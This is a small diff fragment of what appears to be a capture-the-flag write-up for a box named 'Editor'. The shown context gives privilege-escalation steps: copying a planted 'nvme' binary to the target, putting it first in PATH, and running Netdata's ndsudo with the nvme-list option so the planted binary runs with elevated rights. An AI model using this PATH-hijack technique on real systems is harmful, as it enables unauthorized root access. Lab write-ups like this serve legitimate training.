@@ -363,6 +363,7 @@ scp nvme oliver@editor.htb:~/evilsal/nvme
 export PATH=$HOME/evilsal:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 4. Now, simply run the the `ndsudo` with the `nvme-list` option:
+
 ```bash 
 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
 ```
